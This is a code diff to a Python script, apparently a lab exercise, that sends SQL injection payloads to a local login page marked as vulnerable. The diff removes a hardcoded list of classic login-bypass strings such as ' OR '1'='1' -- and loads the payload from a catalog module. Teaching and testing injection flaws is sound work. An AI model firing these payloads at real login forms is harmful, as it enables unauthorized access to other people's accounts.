@@ -1,17 +1,11 @@
 import requests
 
+from catalog import load_attack
 
 LOGIN_URL = "http://127.0.0.1:5000/vulnerable/login"
 
-PAYLOADS = [
-    "' OR '1'='1' -- ",
-    "' OR 1=1 -- ",
-    "' OR 'a'='a' -- ",
-]
-
-
-def try_payload(payload: str) -> None:
-    data = {"username": payload, "password": "anything"}
+def try_payload(payload: str, password: str) -> None:
+    data = {"username": payload, "password": password}
 
     try:
         response = requests.post(LOGIN_URL, data=data, allow_redirects=False, timeout=5)
@@ -36,9 +30,13 @@ def try_payload(payload: str) -> None:
 
 
 def main() -> None:
+    attack = load_attack(1)
+    payload = attack["payload"]
+    password = attack.get("password", "anything")
+
     print(f"Target: {LOGIN_URL}")
-    for payload in PAYLOADS:
-        try_payload(payload)
+    print(f"Configured payload: {payload!r}")
+    try_payload(payload, password)
 
 
 if __name__ == "__main__":
